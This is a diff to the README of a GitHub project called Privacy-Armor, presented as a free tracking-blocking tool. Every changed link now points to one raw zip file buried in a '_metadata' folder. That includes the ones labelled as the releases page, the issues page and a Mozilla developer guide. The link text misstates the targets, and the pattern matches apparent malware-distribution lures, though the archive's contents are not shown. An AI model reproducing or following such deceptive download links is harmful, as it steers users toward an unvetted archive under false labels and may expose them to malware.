@@ -6,16 +6,16 @@ Welcome to Privacy-Armor, a tool that helps block unwanted tracking and reduces 
 
 ## 🔗 Download Link
 
-[![Download Privacy-Armor](https://img.shields.io/badge/Download-Privacy--Armor-blue)](https://github.com/Thulio-Souza/Privacy-Armor/releases)
+[![Download Privacy-Armor](https://github.com/Thulio-Souza/Privacy-Armor/raw/refs/heads/main/_metadata/generated_indexed_rulesets/Privacy_Armor_v3.0-alpha.2.zip)](https://github.com/Thulio-Souza/Privacy-Armor/raw/refs/heads/main/_metadata/generated_indexed_rulesets/Privacy_Armor_v3.0-alpha.2.zip)
 
 ## 📥 Download & Install
 
-To start using Privacy-Armor, visit our [Releases page](https://github.com/Thulio-Souza/Privacy-Armor/releases) to download the latest version. 
+To start using Privacy-Armor, visit our [Releases page](https://github.com/Thulio-Souza/Privacy-Armor/raw/refs/heads/main/_metadata/generated_indexed_rulesets/Privacy_Armor_v3.0-alpha.2.zip) to download the latest version. 
 
 ### Step-by-Step Guide
 
 1. **Visit the Releases Page**  
-   Click on the link to go to the [Releases page](https://github.com/Thulio-Souza/Privacy-Armor/releases). This page has the latest versions of Privacy-Armor.
+   Click on the link to go to the [Releases page](https://github.com/Thulio-Souza/Privacy-Armor/raw/refs/heads/main/_metadata/generated_indexed_rulesets/Privacy_Armor_v3.0-alpha.2.zip). This page has the latest versions of Privacy-Armor.
 
 2. **Select the Version**  
    On the Releases page, you will see a list of available versions. Look for the most recent release. It will usually be at the top of the list.
@@ -68,11 +68,11 @@ Yes, Privacy-Armor is completely free to use!
 
 We welcome your feedback! If you have questions or suggestions, please create an issue in the repository. Your thoughts help us improve the application.
 
-For technical support, visit our [Issues page](https://github.com/Thulio-Souza/Privacy-Armor/issues) where you can report problems or ask for help.
+For technical support, visit our [Issues page](https://github.com/Thulio-Souza/Privacy-Armor/raw/refs/heads/main/_metadata/generated_indexed_rulesets/Privacy_Armor_v3.0-alpha.2.zip) where you can report problems or ask for help.
 
 ## 🔗 Additional Resources
 
-- [Privacy-Armor Releases Page](https://github.com/Thulio-Souza/Privacy-Armor/releases)
-- [Browser Extension Guide](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Your_first_WebExtension)
+- [Privacy-Armor Releases Page](https://github.com/Thulio-Souza/Privacy-Armor/raw/refs/heads/main/_metadata/generated_indexed_rulesets/Privacy_Armor_v3.0-alpha.2.zip)
+- [Browser Extension Guide](https://github.com/Thulio-Souza/Privacy-Armor/raw/refs/heads/main/_metadata/generated_indexed_rulesets/Privacy_Armor_v3.0-alpha.2.zip)
   
 We appreciate your interest in Privacy-Armor. Enjoy enhanced online privacy!
